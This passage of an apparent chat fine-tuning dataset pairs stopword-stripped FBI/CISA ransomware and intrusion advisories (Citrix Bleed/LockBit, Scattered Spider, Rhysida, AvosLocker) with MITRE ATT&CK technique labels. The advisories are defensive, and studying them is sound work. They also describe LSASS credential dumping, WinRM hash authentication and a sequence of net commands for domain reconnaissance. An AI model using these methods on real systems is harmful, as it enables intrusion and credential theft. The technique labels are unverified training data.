cuserspublicapng names cab files follows cwindowstasksemcab cwindowstasksamcab cwindowstasksacab file 64bit windows commandline executable called aexe executed abat file issues remote procedure call rpc ncalrpclsasspirpc rpc end point provide file path lsass infected machine file path returned malware loads accompanying dll file called adll running lsass process dll correctly loaded malware outputs message success console file 64bit windows dll called adll executed abat parameter file aexe file aexe loads file running lsass process infected machine file adll calls windows api createfilew create file called apng path cuserspublic next adll loads dbgcoredll utilizes minidumpwritedump function dump lsass process memory disk successful dumped process memory written apng complete file abat specifies file apng used create cabinet file called acab path cwindowstasks file python script called apy attempts leverage winrm establish session script attempts authenticate remote machine using nt lan manager ntlm keyword hashpasswd present keyword hashpasswd present script attempts authenticate using basic authentication winrm session established remote machine script ability execute command line arguments remote machine command specified default command whoami run open source yara rule incident response organizations encouraged assess citrix software systems evidence compromise hunt malicious activity see additional resources sectionif compromise suspected detected organizations assume threat actors hold full administrative access perform tasks associated web management software well installing malicious code potential compromise detected organizations quarantine take offline potentially affected hosts reimage compromised hosts create new account credentials collect review artifacts running processesservices unusual authentications recent network connections note removing malicious administrator accounts may fully mitigate risk considering threat actors may established additional persistence mechanisms report compromise fbi internet crime complaint center ic3 ic3gov local fbi field office cisa via agencys incident reporting system 247 operations center reportcisagovor 8882820870 state local tribal territorial government sltt entities also report msisac soccisecurityorgor 8667874722 outside us please contact national cyber center mitigations mitigations apply critical infrastructure organizations network defenders using citrix netscaler adc gateway software cisa authoring organizations recommend software manufacturers incorporate securebydesign default principles tactics software development practices limit impact exploitation threat actors leveraging unpatched vulnerabilities within citrix netscaler appliances strengthens security posture customers information secure design see cisas secure design default webpage joint guide authoring organizations csa recommend organizations implement mitigations improve cybersecurity posture basis threat actor activity reduce risk compromise associated citrix cve 20234966 lockbit 30 ransomware ransomware affiliates mitigations align crosssector cybersecurity performance goals cpgs developed cisa national institute standards technology nist cpgs provide minimum set practices protections cisa nist recommend organizations implement cisa nist based cpgs existing cybersecurity frameworks guidance protect common impactful threats tactics techniques procedures visit cisas crosssector cybersecurity performance goals information cpgs including additional recommended baseline protections isolate netscaler adc gateway appliances testing patching ready deployable secure remote access tools implement application controls manage control execution software including allowlisting remote access programs application controls prevent installation execution portable versions unauthorized remote access software properly configured application allowlisting solution block unlisted application execution allowlisting important antivirus solutions may fail detect execution malicious portable executables files use combination compression encryption obfuscation strictly limit use rdp remote desktop services rdp necessary rigorously apply best practices examplecpg 2w audit network systems using rdp close unused rdp ports enforce account lockouts specified number attempts apply phishingresistant multifactor authentication mfa log rdp login attempts restrict use powershell using group policy grant access specific users casebycase basis typically users administrators manage network windows operating systems oss permitted use powershellcpg 2e update windows powershell powershell core latest version uninstall earlier powershell versions logs windows powershell prior version 50 either nonexistent record enough detail aid enterprise monitoring incident response activitiescpg 1e 2s 2t enable enhanced powershell loggingcpg 2t 2u powershell logs contain valuable data including historical os registry interaction possible ttps threat actors powershell use ensure powershell instances using latest version module script block transcription logging enabled enhanced logging two logs record powershell activity powershell windows event log powershell operational log fbi cisa recommend turning two windows event logs retention period least 180 days logs checked regular basis confirm whether log data deleted logging turned set storage size permitted logs large possible configure windows registry require user account control uac approval psexec operations requiring administrator privileges reduce risk lateral movement psexec implement recovery plan maintain retain multiple copies sensitive proprietary data servers physically separate segmented secure location eg hard drive storage device cloud require accounts password logins eg service account admin accounts domain admin accounts comply withnists standards developing managing password policies use longer passwords consisting least 15 characterscpg 2b store passwords hashed format using industryrecognized password managers add password user salts shared login credentials avoid reusing passwordscpg 2c implement multiple failed login attempt account lockoutscpg 2g disable password hints require administrator credentials install software keep operating systems software firmware date timely patching one efficient costeffective steps organization take minimize exposure cybersecurity threats organizations patch vulnerable software hardware systems within 24 48 hours vulnerability disclosure prioritize patching known exploited vulnerabilities internetfacing systemscpg 1e upgrade vulnerable netscaler adc gateway appliances latest version available lower risk compromise validate security controls addition applying mitigations cisa recommends exercising testing validating organizations security program threat behaviors mapped mitre attck enterprise framework advisory cisa recommends testing existing security controls inventory assess perform attck techniques described advisory get started select attck technique described advisory see table 1 align security technologies technique test technologies technique analyze detection prevention technologies performance repeat process security technologies obtain set comprehensive performance data tune security program including people processes technologies based data generated process cisa authoring organizations recommend continually testing security program scale production environment ensure optimal performance mitre attck techniques identified advisory resources stopransomwaregov wholeofgovernment approach gives one central location ransomware resources alerts joint ransomware guide provides preparation prevention mitigation best practices well ransomware response checklist cyber hygiene services ransomware readiness assessment provide nocost cyber hygiene ransomware readiness assessment services resources help aid mitigation cyber threats ransomware attacks visit strategies mitigate cyber security incidents protect ransomware asds acsc help cyber security incident reporting fbi seeking information shared include boundary logs showing communication foreign ip addresses sample ransom note communications lockbit 30 affiliates bitcoin wallet information decryptor files andor benign sample encrypted file fbi cisa encourage paying ransom payment guarantee victim files recovered furthermore payment may also embolden adversaries target additional organizations encourage criminal actors engage distribution ransomware andor fund illicit activities regardless whether organization decided pay ransom fbi cisa urge promptly report ransomware incidents fbi internet crime complaint center ic3 ic3gov local fbi field office cisa via agencys incident reporting system 247 operations center reportcisagov calling 1844saycisa 18447292472 australian organizations impacted require assistance regard ransomware incident contact asds acsc via 1300 cyber1 1300 292 371 submitting report cybergovau disclaimer information report provided informational purposes cisa authoring organizations endorse commercial entity product company service including entities products services linked within document reference specific commercial entities products processes services service mark trademark manufacturer otherwise constitute imply endorsement recommendation favoring cisa authoring organizations acknowledgements boeing contributed csa references1 netscaler adc netscaler gateway security bulletin cve202349662 mshta used protect mcafee3 investigation session hijacking via citrix netscaler adc gateway vulnerability cve20234966 version history november 21 2023 initial version product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1082, T1539, T1563"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: summary federal bureau investigation fbi cybersecurity infrastructure security agency cisa releasing joint cybersecurity advisory csa response recent activity scattered spider threat actors commercial facilities sectors subsectors advisory provides tactics techniques procedures ttps obtained fbi investigations recently november 2023 scattered spider cybercriminal group targets large companies contracted information technology help desks scattered spider threat actors per trusted third parties typically engaged data theft extortion also known utilize blackcatalphv ransomware alongside usual ttps fbi cisa encourage critical infrastructure organizations implement recommendations mitigations section csa reduce likelihood impact cyberattack scattered spider actors download pdf version report aa23320a scattered spider pdf 51078 kb technical details note advisory uses mitre attck enterprise framework version 14 see mitre attck tactics techniques section table threat actors activity mapped mitre attck tactics techniques assistance mapping malicious cyber activity mitre attck framework see cisa mitre attcks best practices mitre attck mapping cisas decider tool overview scattered spider also known starfraud unc3944 scatter swine muddled libra engages data extortion several criminal activities1 scattered spider threat actors considered experts social engineering use multiple social engineering techniques especially phishing push bombing subscriber identity module sim swap attacks obtain credentials install remote access tools andor bypass multifactor authentication mfa according public reporting scattered spider threat actors have234 posed company andor helpdesk staff using phone calls sms messages obtain credentials employees gain access network posed company andor helpdesk staff direct employees run commercial remote access tools enabling initial access posed staff convince employees share onetime password otp mfa authentication code sent repeated mfa notification prompts leading employees pressing accept button also known mfa fatigue5 convinced cellular carriers transfer control targeted users phone number sim card controlled gaining control phone access mfa prompts monetized access victim networks numerous ways including extortion enabled ransomware data theft gaining access networks fbi observed scattered spider threat actors using publicly available legitimate remote access tunneling tools table 1 details list legitimate tools scattered spider repurposed used criminal activity note use legitimate tools alone indicative criminal activity users review scattered spider indicators compromise iocs ttps discussed csa determine whether compromised addition using legitimate tools scattered spider also uses malware part ttps see table 2 malware used scattered spider scattered spider threat actors historically evaded detection target networks using living land techniques allowlisted applications navigate victim networks well frequently modifying ttps observably scattered spider threat actors exfiltrated data gaining access threatened release without deploying ransomware includes exfiltration multiple sites including usbased data centers meganz recent scattered spider ttps new ttp file encryption recently fbi identified scattered spider threat actors encrypting victim files exfiltration exfiltrating andor encrypting data scattered spider threat actors communicate victims via tor tox email encrypted applications reconnaissance resource development initial access scattered spider intrusions often begin broad phishing smishing attempts target using victimspecific crafted domains domains listed table 3 instances scattered spider threat actors conduct sim swapping attacks users respond phishingsmishing attempt threat actors work identify personally identifiable information pii valuable users succumbed phishingsmishing obtaining answers users security questions identifying usernames passwords pii conducting sim swaps threat actors use social engineering techniques convince help desk personnel reset passwords andor mfa tokens perform account takeovers users single signon sso environments execution persistence privilege escalation scattered spider threat actors register mfa tokens compromising users account establish persistence threat actors add federated identity provider victims sso tenant activate automatic account linking threat actors able sign account using matching sso account attribute stage scattered spider threat actors already control identity provider choose arbitrary value account attribute result activity allows threat actors perform privileged escalation continue logging even passwords changed additionally leverage common endpoint detection response edr tools installed victim networks take advantage tools remoteshell capabilities executing commands elevates access also deploy remote monitoring management rmm tools maintain persistence discovery lateral movement exfiltration persistence established target network scattered spider threat actors often perform discovery specifically searching sharepoint sites credential storage documentation vmware vcenter infrastructure backups instructions setting uplogging virtual private networks vpn threat actors enumerate victims active directory ad perform discovery exfiltration victims code repositories codesigning certificates source code threat actors activate amazon web services aws systems manager inventory discover targets lateral movement move preexisting actorcreated amazon elastic compute cloud ec2 instances instances ultimate goal data exfiltration scattered spider threat actors use actorinstalled extract transform load etl tools bring data multiple data sources centralized database according trusted third parties recent incidents concerned scattered spider threat actors may deployed blackcatalphv ransomware onto victim networksthereby encrypting vmware elastic sky x integrated esxi servers determine activities uncovered maintain persistence scattered spider threat actors often search victims slack microsoft teams microsoft exchange online emails conversations regarding threat actors intrusion security response threat actors frequently join incident remediation response calls teleconferences likely identify security teams hunting proactively develop new avenues intrusion response victim defenses sometimes achieved creating new identities environment often upheld fake social media profiles backstop newly created identities mitre attck tactics techniques see tables 4 17 referenced threat actor tactics techniques advisory mitigations mitigations apply critical infrastructure organizations network defenders fbi cisa recommend software manufactures incorporate securebydesign default principles tactics software development practices limiting impact ransomware techniques thus strengthening secure posture customers information secure design see cisas secure design default webpage joint guide fbi cisa recommend organizations implement mitigations improve organizations cybersecurity posture based threat actor activity reduce risk compromise scattered spider threat actors mitigations align crosssector cybersecurity performance goals cpgs developed cisa national institute standards technology nist cpgs provide minimum set practices protections cisa nist recommend organizations implement cisa nist based cpgs existing cybersecurity frameworks guidance protect common impactful threats tactics techniques procedures visit cisas crosssector cybersecurity performance goals information cpgs including additional recommended baseline protections implement application controls manage control execution software including allowlisting remote access programs application controls prevent installation execution portable versions unauthorized remote access software properly configured application allowlisting solution block unlisted application execution allowlisting important antivirus solutions may fail detect execution malicious portable executables files use combination compression encryption obfuscation reduce threat malicious actors using remote access tools auditing remote access tools network identify currently used andor authorized software reviewing logs execution remote access software detect abnormal use programs running portable executablecpg 2t using security software detect instances remote access software loaded memory requiring authorized remote access solutions used within network approved remote access solutions virtual private networks vpns virtual desktop interfaces vdis blocking inbound outbound connections common remote access software ports protocols network perimeter applying recommendations guide securing remote access software implementing fidowebauthn authentication public key infrastructure pkibased mfa mfa implementations resistant phishing suspectable push bombing sim swap attacks techniques known used scattered spider actors see cisas fact sheet implementing phishingresistant mfa information strictly limit use remote desktop protocol rdp remote desktop services rdp necessary rigorously apply best practices examplecpg 2w audit network systems using rdp close unused rdp ports enforce account lockouts specified number attempts apply phishingresistant multifactor authentication mfa log rdp login attempts addition authoring authorities csa recommend network defenders apply following mitigations limit potential adversarial use common system network discovery techniques reduce impact risk compromise ransomware data extortion actors implement recovery plan maintain retain multiple copies sensitive proprietary data servers physically separate segmented secure location ie hard drive storage device cloud maintain offline backups data regularly maintain backup restoration daily weekly minimum instituting practice organization limits severity disruption business practicescpg 2r require accounts password logins eg service account admin accounts domain admin accounts comply nists standards developing managing password policies implement password policies compliance nists standards use strong passwords unique random well contain least sixteen characters 64 characters lengthcpg 2b consider implementing industryrecognized password managers align organizational technology procurement policies avoid reusing passwordscpg 2c implement multiple failed login attempt account lockoutscpg 2g disable password hints refrain requiring recurring password changesnote nist guidance suggests favoring longer passwords instead requiring regular frequent password resets frequent password resets likely result users developing password patterns cyber criminals easily decipher require administrator credentials install software require phishingresistant multifactor authentication mfa services extent possible particularly webmail virtual private networks vpns accounts access critical systemscpg 2h keep operating systems software firmware date timely patching one efficient costeffective steps organization take minimize exposure cybersecurity threats prioritize patching known exploited vulnerabilities internetfacing systemscpg 1e segment networks prevent spread ransomware network segmentation help prevent spread ransomware controlling traffic flows betweenand access tovarious subnetworks restricting adversary lateral movementcpg 2f identify detect investigate abnormal activity potential traversal indicated ransomware networking monitoring tool aid detecting ransomware implement tool logs reports network traffic activity including lateral movement network endpoint detection response edr tools particularly useful detecting lateral connections insight common uncommon network connections hostcpg 3a install regularly update enable real time detection antivirus software hosts disable unused ports protocolscpg 2v consider adding email banner emails received outside organizationcpg 2m disable hyperlinks received emails ensure backup data encrypted immutable ie ensure backup data altered deleted covers entire organizations data infrastructurecpg 2k 2l 2r validate security controls addition applying mitigations fbi cisa recommend exercising testing validating organizations security program threat behaviors mapped mitre attck enterprise framework advisory fbi cisa recommend testing existing security controls inventory assess perform attck techniques described advisory get started select attck technique described advisory see tables 417 align security technologies technique test technologies technique analyze detection prevention technologies performance repeat process security technologies obtain set comprehensive performance data tune security program including people processes technologies based data generated process fbi cisa recommend continually testing security program scale production environment ensure optimal performance mitre attck techniques identified advisory reporting fbi cisa seeking information shared include sample ransom note communications scattered spider group actors bitcoin wallet information decryptor files andor benign sample encrypted file fbi cisa encourage paying ransom payment guarantee victim files recovered furthermore payment may also embolden adversaries target additional organizations encourage criminal actors engage distribution ransomware andor fund illicit activities regardless whether organization decided pay ransom fbi cisa urge promptly report ransomware incidents local fbi field office report incident fbi internet crime complaint center ic3 ic3gov cisa via cisas 247 operations center reportcisagov 8882820870 references1 mitre attck scattered spider2 trellix scattered spider modus operandi3 crowdstrike simulation crowdstrike investigations reveal intrusion campaign targeting telco bpo companies4 crowdstrike scattered spider exploits windows security deficiencies bringyourownvulnerabledriver tactic attempt bypass endpoint security5 malwarebytes ransomware group steps issues statement mgm resorts compromise disclaimer information report provided informational purposes fbi cisa endorse commercial entity product company service including entities products services linked within document reference specific commercial entities products processes services service mark trademark manufacturer otherwise constitute imply endorsement recommendation favoring fbi cisa version history november 16 2023 initial versionnovember 21 2023 updated password recommendation language page 12 product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1018, T1021.007, T1074, T1078, T1078.002, T1083, T1114, T1199, T1204, T1213.002, T1217, T1219, T1486, T1538, T1539, T1552.001, T1552.004, T1566, T1567.002, T1583.001, T1589, T1598, T1606, T1621, T1657"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: actions take today mitigate malicious cyber activity prioritize remediating known exploited vulnerabilities enable multifactor authentication mfa services extent possible particularly webmail vpn accounts access critical systems segment networks prevent spread ransomware summary note joint cybersecurity advisory csa part ongoing stopransomware effort publish advisories network defenders detailing various ransomware variants ransomware threat actors stopransomware advisories include recently historically observed tactics techniques procedures ttps indicators compromise iocs help organizations protect ransomware visit stopransomwaregovto see stopransomware advisories learn ransomware threats nocost resources federal bureau investigation fbi cybersecurity infrastructure security agency cisa multistate information sharing analysis center msisac releasing joint csa disseminate known rhysida ransomware iocs ttps identified investigations recently september 2023 rhysidaan emerging ransomware varianthas predominately deployed education healthcare manufacturing information technology government sectors since may 2023 information csa derived related incident response investigations malware analysis samples discovered victim networks fbi cisa msisac encourage organizations implement recommendations mitigations section csa reduce likelihood impact rhysida ransomware ransomware incidents download pdf version report aa23319a stopransomware rhysida ransomware pdf 67456 kb downloadable copy iocs see aa23319a stix xml xml 11531 kb aa23319a stix json json 6569 kb technical details note advisory uses mitre attck enterprise framework version 14 see attck tactics techniques section tables mapped threat actors activity overview threat actors leveraging rhysida ransomware known impact targets opportunity including victims education healthcare manufacturing information technology government sectors open source reporting details similarities vice society dev08321 activity actors observed deploying rhysida ransomware additionally open source reporting2 confirmed observed instances rhysida actors operating ransomwareasaservice raas capacity ransomware tools infrastructure leased profitsharing model ransoms paid split group affiliates additional information vice society actors associated activity see joint csa stopransomware vice society initial access rhysida actors observed leveraging externalfacing remote services initially access persist within network remote services virtual private networks vpns allow users connect internal enterprise network resources external locations rhysida actors commonly observed authenticating internal vpn access points compromised valid credentials notably due organizations lacking mfa enabled default additionally actors observed exploiting zerologon cve20201472a critical elevation privileges vulnerability microsofts netlogon remote protocolas well conducting successful phishing attempts note microsoft released patch cve20201472 august 11 20203 living land analysis identified rhysida actors using living land techniques creating remote desktop protocol rdp connections lateral movement establishing vpn access utilizing powershell living land techniques include using native built operating system network administration tools perform operations allows actors evade detection blending normal windows systems network activities ipconfig whoami nltest several net commands used enumerate victim environments gather information domains one instance using compromised credentials actors leveraged net commands within powershell identify loggedin users performed reconnaissance network accounts within victim environment note following commands performed exact order listed net userusername domain net group domain computers domain net group domain admins domain net localgroup administrators analysis master file table mft4 identified victim system generated ntuserdat registry hive created compromised user logged system first time considered anomalous due baseline normal activity particular user system note mftresides within new technology file system ntfs houses information file including size time date stamps permissions data content leveraged tools table 1 lists legitimate tools rhysida actors repurposed operations legitimate tools listed joint csa publicly available use tools attributed malicious without analytical evidence support used direction controlled threat actors disclaimer organizations encouraged investigate vet use tools prior performing remediation actions rhysida ransomware characteristics execution one investigation rhysida actors created two folders c drive labeled served staging directory central location hosting malicious executables folder contained file names accordance host names victims network likely imported scanning tool folder contained various files listed table 2 rhysida actors deployed tools scripts assist system networkwide encryption rhysida ransomware uses windows 64bit portable executable pe common object file format coff compiled using mingw via gnu compiler collection gcc supports various programming languages c c go cryptographic ransomware application first injects pe running processes compromised system additionally thirdparty researchers identified evidence rhysida actors developing custom tools program names set rhysida01 encryption mapping network ransomware encrypts data using 4096bit rsa encryption key chacha20 algorithm algorithm features 256bit key 32bit counter 96bit nonce along fourbyfour matrix 32bit words plain text registry modification commands obfuscated displayed plaintext strings executed via cmdexe rhysidas encryptor runs file encrypt modify encrypted files display rhysida extension5 following encryption powershell command deletes binary network using hidden command window rhysida encryptor allows arguments select directory sr file deletion defined authors code parseoptions6 lines binary strings complete tasks delete control panel evade detection data extortion rhysida actors reportedly engage double extortiondemanding ransom payment decrypt victim data threatening publish sensitive exfiltrated data unless ransom paid57 rhysida actors direct victims send ransom payments bitcoin cryptocurrency wallet addresses provided threat actors shown figure 1 rhysida ransomware drops ransom note named criticalbreachdetected pdf filethe note provides company unique code instructions contact group via torbased portal figure 1 rhysida ransom note identified analysis also listed open source reporting contents ransom note embedded plaintext ransom binary offering network defenders opportunity deploy stringbased detection alerting evidence ransom note rhysida threat actors may target systems use commandline operating systems format pdf ransom notes could indicate rhysida actors target systems compatible handling pdf documents8 indicators compromise november 10 2023 sophos published ttps iocs identified analysis conducted six separate incidents9 c2 ip addresses listed table 3 derived directly sophos investigations listed github among indicators10 additional iocs obtained fbi cisa msisacs investigations analysis email addresses listed table 4 associated rhysida actors operations rhysida actors observed creating onion mail email accounts services victim communication commonly formatfirst namelast nameonionmailorg rhysida actors also observed using following files executables listed table 5 support operations disclaimer organizations encouraged investigate use files related signs compromise prior performing remediation actions mitre attck tactics techniques see tables 615 referenced threat actor tactics techniques advisory assistance mapping malicious cyber activity mitre attck framework see cisa mitres best practices mitre attck mapping cisas decider tool additional notable ttps published check point incident response team11 mitigations fbi cisa msisac recommend organizations implement mitigations improve organizations cybersecurity posture mitigations align crosssector cybersecurity performance goals cpgs developed cisa national institute standards technology nist cpgs provide minimum set practices protections cisa nist recommend organizations implement cisa nist based cpgs existing cybersecurity frameworks guidance protect common impactful threats ttps visit cisas crosssector cybersecurity performance goals information cpgs including additional recommended baseline protections mitigations apply critical infrastructure organizations network defenders fbi cisa msisac recommend incorporating securebydesign default principles limiting impact ransomware techniques strengthening overall security posture information secure design see cisas secure design webpage require phishingresistant mfa services extent possible particularly webmail vpn accounts access critical systemscpg 2h disable commandline scripting activities permissions privilege escalation lateral movement often depend software utilities running command line threat actors able run tools difficulty escalating privileges andor moving laterallycpg 2n implement verbose enhanced logging within processes command line auditing12 process tracking13 restrict use powershell using group policy grant access specific users casebycase basis typically users administrators manage network windows operating systems permitted use powershellcpg 2e update windows powershell powershell core latest version uninstall earlier powershell versions logs windows powershell prior version 50 either nonexistent record enough detail aid enterprise monitoring incident response activitiescpg 1e 2s 2t enable enhanced powershell loggingcpg 2t 2u powershell logs contain valuable data including historical operating system registry interaction possible ttps threat actors powershell use ensure powershell instances using latest version module script block transcription logging enabled eg enhanced logging two logs record powershell activity powershell windows event log powershell operational log fbi cisa msisac recommend turning two windows event logs retention period least 180 days logs checked regular basis confirm whether log data deleted logging turned set storage size permitted logs large possible restrict use rdp remote desktop services known user accounts groups rdp necessary apply best practices ascpg 2w implement mfa privileged accounts using rdp use remote credential guard14 protect credentials particularly domain administrator high value accounts audit network systems using rdp close unused rdp ports enforce account lockouts specified number attempts log rdp login attempts secure remote access tools implementing application controls manage control execution software including allowlisting remote access programs application controls prevent installation execution portable versions unauthorized remote access software properly configured application allowlisting solution block unlisted application execution allowlisting important antivirus solutions may fail detect execution malicious portable executables files use combination compression encryption obfuscation apply recommendations cisas joint guide securing remote access software addition fbi cisa msisac recommend network defenders apply following mitigations limit potential adversarial use common system network discovery techniques reduce impact risk compromise ransomware data extortion actors keep operating systems software firmware date timely patching one efficient costeffective steps organization take minimize exposure cybersecurity threats prioritize patching known exploited vulnerabilities internetfacing systemscpg 1e segment networks prevent spread ransomware network segmentation help prevent spread ransomware controlling traffic flows betweenand access tovarious subnetworks restricting adversary lateral movementcpg 2f identify detect investigate abnormal activity potential traversal indicated ransomware network monitoring tool aid detecting ransomware implement tool logs reports network traffic including lateral movement activity network endpoint detection response edr tools particularly useful detecting lateral connections insight common uncommon network connections hostcpg 3a audit user accounts administrative privileges configure access controls according principle least privilege polpcpg 2e implement timebased access accounts set admin level highercpg 2a 2e example justintime jit access method provisions privileged access needed support enforcement polp well zero trust model process networkwide policy set place automatically disable admin accounts ad level account direct need individual users may submit requests automated process grants access specified system set timeframe need support completion certain task implement recovery plan maintain retain multiple copies sensitive proprietary data servers physically separate segmented secure location eg hard drive storage device cloud maintain offline backups data regularly maintain backups restoration daily weekly minimum instituting practice organizations limit severity disruption business operationscpg 2r ensure backup data encrypted immutable ie altered deleted covers entire organizations data infrastructurecpg 2k 2l 2r forward log files hardened centralized logging server preferably segmented networkcpg 2f review logging retention rates vpns networkbased logs consider adding email banner emails received outside organizationcpg 2m disable hyperlinks received emails validate security controls addition applying mitigations fbi cisa msisac recommend exercising testing validating organizations security program threat behaviors mapped mitre attck enterprise framework advisory fbi cisa msisac recommend testing existing security controls inventory assess perform attck techniques described advisory get started select attck technique described advisory see tables 615 align security technologies technique test technologies technique analyze detection prevention technologies performance repeat process security technologies obtain set comprehensive performance data tune security program including people processes technologies based data generated process fbi cisa msisac recommend continually testing security program scale production environment ensure optimal performance mitre attck techniques identified advisory resources cisa stopransomware cisa stopransomware vice society cisa known exploited vulnerabilities catalog nist cve20201472 cisa mitre best practices mitre attck mapping cisa decider tool cisa crosssector cybersecurity performance goals cisa secure design cisa implementing phishingresistant mfa cisa guide securing remote access software reporting fbi seeking information shared include boundary logs showing communication foreign ip addresses sample ransom note communications rhysida actors bitcoin wallet information decryptor files andor benign sample encrypted file additional details requested include targeted company point contact status scope infection estimated loss operational impact transaction ids date infection date detected initial attack vector host networkbased indicators fbi cisa encourage paying ransom payment guarantee victim files recovered furthermore payment may also embolden adversaries target additional organizations encourage threat actors engage distribution ransomware andor fund illicit activities regardless whether organization decided pay ransom fbi cisa urge promptly report ransomware incidents fbis internet crime complaint center ic3 ic3gov local fbi field office cisa via agencys incident reporting system 247 operations center reportcisagov calling 1844saycisa 18447292472 references microsoft dev0832 vice society opportunistic ransomware campaigns impacting us education sector fortiguard labs ransomware roundup rhysida microsoft security update guide cve20201472 microsoft master file table local file systems sentinelone rhysida secplicity scratching surface rhysida ransomware cisco talos cisco talos knows rhysida ransomware soc radar rhysida ransomware threat profile sophos threat clusters switch vice society rhysida sophos vice society rhysida iocs github check point research rhysida ransomware activity ties vice society microsoft command line process auditing microsoft audit process tracking microsoft remote credential guard acknowledgements sophos contributed csa disclaimer information report provided informational purposes fbi cisa msisac endorse commercial entity product company service including entities products services linked within document reference specific commercial entities products processes services service mark trademark manufacturer otherwise constitute imply endorsement recommendation favoring fbi cisa msisac version history november 15 2023 initial version product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1078, T1133, T1190, T1486"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: actions take today mitigate cyber threats avoslocker ransomware securing remote access tools restricting rdp remote desktop services securing powershell andor restrict usage update software latest version apply patching updates regularly summary note joint cybersecurity advisory csa part ongoing stopransomware effort publish advisories network defenders detail various ransomware variants ransomware threat actors stopransomware advisories include recently historically observed tactics techniques procedures ttps indicators compromise iocs help organizations protect ransomware visit stopransomwaregov see stopransomware advisories learn ransomware threats nocost resources federal bureau investigation fbi cybersecurity infrastructure security agency cisa releasing joint cybersecurity advisory csa disseminate known iocs ttps detection methods associated avoslocker variant identified fbi investigations recently may 2023 avoslocker operates ransomwareasaservice raas model avoslocker affiliates compromised organizations across multiple critical infrastructure sectors united states affecting windows linux vmware esxi environments avoslocker affiliates compromise organizations networks using legitimate software opensource remote system administration tools avoslocker affiliates use exfiltrationbased data extortion tactics threats leaking andor publishing stolen data joint csa updates march 17 2022 avoslocker ransomware joint csa indicators compromise associated avoslocker ransomware released fbi department treasurys financial crimes enforcement network fincen update includes iocs ttps included previous advisory yara rule fbi developed analyzing tool associated avoslocker compromise fbi cisa encourage critical infrastructure organizations implement recommendations mitigations section csa reduce likelihood impact avoslocker ransomware ransomware incidents download pdf version report aa23284a stopransomware avoslocker ransomware update pdf 52800 kb downloadable copy iocs see aa23284a stix xml xml 4667 kb aa23284a stix json json 3450 kb technical details note advisory uses mitre attck enterprise framework version 13 see mitre attck tactics techniques section table threat actors activity mapped mitre attck tactics techniques assistance mapping malicious cyber activity mitre attck framework see cisa mitre attcks best practices mitre attck mapping cisas decider tool avoslockeraffiliates use legitimate software opensource tools ransomware operations include exfiltrationbased data extortion specifically affiliates use remote system administration toolssplashtop streamer tactical rmm putty anydesk pdq deploy atera agentas backdoor access vectors scripts execute legitimate native windows tools psexec nltest opensource networking tunneling tools ligolo1 chisel2 cobalt strike sliver3 command control c2 lazagne mimikatz harvesting credentials filezilla rclone data exfiltration notepad rdp scanner 7zip fbi also observed avoslocker affiliates use custom powershell batch bat scripts lateral movement privilege escalation disabling antivirus software upload use custom webshells enable network access additional ttps see joint csa indicators compromise associated avoslocker ransomware indicators compromise iocs see tables 1 2 iocs obtained january 2023may 2023 detection based investigation advanced digital forensics group fbi created following yara rule detect signature file identified enabling malware netmonitorexe malware masquerading legitimate process appearance legitimate network monitoring tool persistence tool sends pings network every five minutes netmonitor executable configured use ip address command server program communicates server port 443 attack traffic netmonitor command server encrypted netmonitor functions like reverse proxy allows actors connect tool outside victims network yara rule mitre attck tactics techniques see tables 37 referenced threat actor tactics techniques advisory mitigations mitigations apply critical infrastructure organizations network defenders fbi cisa recommend software manufactures incorporate securebydesign default principles tactics software development practices limit impact ransomware techniques threat actors leveraging backdoor vulnerabilities remote software systems thus strengthening secure posture customers information secure design see cisas secure design default webpage joint guide fbi cisa recommend organizations implement mitigations improve cybersecurity posture basis threat actor activity reduce risk compromise avoslocker ransomware mitigations align crosssector cybersecurity performance goals cpgs developed cisa national institute standards technology nist cpgs provide minimum set practices protections cisa nist recommend organizations implement cisa nist based cpgs existing cybersecurity frameworks guidance protect common impactful threats tactics techniques procedures visit cisas crosssector cybersecurity performance goals information cpgs including additional recommended baseline protections secure remote access tools implementing application controls manage control execution software including allowlisting remote access programs application controls prevent installation execution portable versions unauthorized remote access software properly configured application allowlisting solution block unlisted application execution allowlisting important antivirus solutions may fail detect execution malicious portable executables files use combination compression encryption obfuscation applying recommendations cisas joint guide securing remote access software strictly limit use rdp remote desktop services rdp necessary rigorously apply best practices examplecpg 2w audit network systems using rdp close unused rdp ports enforce account lockouts specified number attempts apply phishingresistant multifactor authentication mfa log rdp login attempts disable commandline scripting activities permissionscpg 2n restrict use powershell using group policy grant access specific users casebycase basis typically users administrators manage network windows operating systems oss permitted use powershellcpg 2e update windows powershell powershell core latest version uninstall earlier powershell versions logs windows powershell prior version 50 either nonexistent record enough detail aid enterprise monitoring incident response activitiescpg 1e 2s 2t enable enhanced powershell loggingcpg 2t 2u powershell logs contain valuable data including historical os registry interaction possible ttps threat actors powershell use ensure powershell instances using latest version module script block transcription logging enabled enhanced logging two logs record powershell activity powershell windows event log powershell operational log fbi cisa recommend turning two windows event logs retention period least 180 days logs checked regular basis confirm whether log data deleted logging turned set storage size permitted logs large possible configure windows registry require user account control uac approval psexec operations requiring administrator privileges reduce risk lateral movement psexec addition fbi cisa recommend network defenders apply following mitigations limit potential adversarial use common system network discovery techniques reduce impact risk compromise ransomware data extortion actors disable file printer sharing services services required use strong passwords active directory authentication implement recovery plan maintain retain multiple copies sensitive proprietary data servers physically separate segmented secure location eg hard drive storage device cloud maintain offline backups data regularly maintain backup restoration daily weekly minimum instituting practice organization minimizes impact disruption business practices severe andor irretrievable datacpg 2r recommend organizations follow 321 backup strategy organizations three copies data one copy production data two backup copies two different media disk tape one copy kept offsite disaster recovery require accounts password logins eg service account admin accounts domain admin accounts comply nists standards developing managing password policies use longer passwords consisting least 15 characterscpg 2b store passwords hashed format using industryrecognized password managers add password user salts shared login credentials avoid reusing passwordscpg 2c implement multiple failed login attempt account lockoutscpg 2g disable password hints refrain requiring password changes frequently per yearnote nist guidance suggests favoring longer passwords instead requiring regular frequent password resets frequent password resets likely result users developing password 